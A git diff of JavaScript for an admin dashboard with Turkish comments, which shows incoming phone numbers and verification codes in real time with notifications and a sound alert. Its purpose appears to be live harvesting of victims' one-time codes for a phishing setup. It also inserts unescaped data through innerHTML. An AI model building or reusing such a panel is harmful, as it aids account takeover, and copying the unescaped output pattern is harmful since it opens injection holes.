@@ -8,13 +8,16 @@ socket.on("connect", () => {
   console.log("ADMIN SOCKET CONNECTED:", socket.id);
 });
 
+// Yeni telefon numarası alındığında
 socket.on("admin-new-phone", (data) => {
   console.log("ADMIN PHONE GELDİ:", data);
 
   const tr = document.createElement("tr");
+  tr.classList.add("flash"); // Yanıp sönme efekti ekle
   tr.innerHTML = `<td>${data.phone}</td><td>${data.date}</td>`;
   phoneTable.prepend(tr);
 
+  // Bildirim ve ses
   if (Notification.permission === "granted") {
     new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
   } else if (Notification.permission !== "denied") {
@@ -27,13 +30,16 @@ socket.on("admin-new-phone", (data) => {
   audio.play().catch(err => console.log('Ses hatası:', err));
 });
 
+// Yeni doğrulama kodu alındığında
 socket.on("admin-new-code", (data) => {
   console.log("ADMIN CODE GELDİ:", data);
 
   const tr = document.createElement("tr");
+  tr.classList.add("flash"); // Yanıp sönme efekti ekle
   tr.innerHTML = `<td>${data.code}</td><td>${data.date}</td>`;
   codeTable.prepend(tr);
 
+  // Bildirim ve ses
   if (Notification.permission === "granted") {
     new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
   } else if (Notification.permission !== "denied") {
